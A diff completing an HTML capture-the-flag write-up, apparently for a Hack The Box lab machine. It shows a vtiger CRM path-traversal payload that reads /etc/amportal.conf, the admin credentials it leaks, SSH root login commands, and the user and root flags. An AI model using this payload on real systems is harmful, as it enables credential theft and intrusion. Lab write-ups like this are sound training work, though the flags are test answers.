@@ -175,4 +175,57 @@
             <div class="terminal-box">https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action</div>
 
             <p>This leaked the admin credentials: <code>admin:jEhdIekWmdjE</code></p>
-            <img src="/pngs/HTB/Easy/Alert/Pasted%20image%20
+            <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250505124352.png" alt="LFI Result">
+
+            <p>Since the SSH version was quite old, I had to use specific algorithms to connect:</p>
+            <div class="terminal-box">ssh -oHostKeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group14-sha1 root@10.10.10.7</div>
+
+            <h3 class="step-header">3. Troubleshooting SSH</h3>
+            <p>If you encounter negotiation errors, use these flags:</p>
+            <div class="terminal-box">$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 admin@10.10.10.7</div>
+
+            <fieldset>
+                <legend>User Flag</legend>
+                <code>ba840a922b6df8c81ffe9d45db7cd5fb</code>
+            </fieldset>
+
+            <fieldset>
+                <legend>Root Flag</legend>
+                <code>a7399de4bbbcd6982bad73ff86884952</code>
+            </fieldset>
+        </div>
+
+        <aside class="sidebar">
+            <nav class="sticky-nav">
+                <a href="/index.html" class="nav-btn">Home</a>
+                <a href="/machines.html" class="nav-btn">Machines</a>
+            </nav>
+        </aside>
+    </div>
+
+    <script>
+        document.querySelectorAll('.terminal-box').forEach((box) => {
+            // Create wrapper
+            const wrapper = document.createElement('div');
+            wrapper.className = 'terminal-wrapper';
+            box.parentNode.insertBefore(wrapper, box);
+            wrapper.appendChild(box);
+
+            // Create button
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.innerText = 'Copy';
+
+            btn.addEventListener('click', () => {
+                const text = box.innerText;
+                navigator.clipboard.writeText(text).then(() => {
+                    btn.innerText = 'Copied!';
+                    setTimeout(() => { btn.innerText = 'Copy'; }, 2000);
+                });
+            });
+
+            wrapper.appendChild(btn);
+        });
+    </script>
+</body>
+</html>
